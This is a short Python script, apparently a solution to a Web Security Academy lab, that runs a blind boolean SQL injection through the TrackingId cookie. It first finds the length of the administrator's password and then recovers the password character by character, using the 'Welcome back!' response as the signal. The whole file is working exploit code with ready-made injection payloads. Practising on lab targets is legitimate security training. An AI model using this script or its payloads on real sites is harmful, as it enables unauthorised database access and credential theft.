import requests
url='https://0acf00810496f88a812b219500f200cd.web-security-academy.net/filter?category=Pets'

char='1234567890qwertyuiopasdfghjklzxcvbnm'
length=0
password=''


def get_length():
    for i in range(1,101):
        cookie = {
            'TrackingId':'Ee0dCiojUhdL39J5',
            'session':'EUomjDfPNegJxxfkvCHYATdoev7gEzW7'
                 }
        payload=f"'AND+LENGTH((SELECT+password+FROM+users+WHERE+username%3d'administrator'))%3d{i}--"
        cookie['TrackingId'] += payload
        response = requests.get(url,cookies=cookie)
        print('running...')
        if 'Welcome back!' in response.text:
            print(f"password length is {i}") 
            length=i
            break
        

def crack_password():
    passs=''

    
    for i in range(1,21):
        for p in char:
            cookie = {
                'TrackingId':'Ee0dCiojUhdL39J5',
                'session':'EUomjDfPNegJxxfkvCHYATdoev7gEzW7'
                    }
            payload=f"'AND SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'), {i}, 1)='{p}'--"
            cookie['TrackingId'] += payload
            response = requests.get(url,cookies=cookie)
            if 'Welcome back!' in response.text:
                passs=passs+p
                print(f'{passs}')
                break
    print(f"the password is {passs}")

# get_length();
# print("dumping data");
print("checking password ")
crack_password();

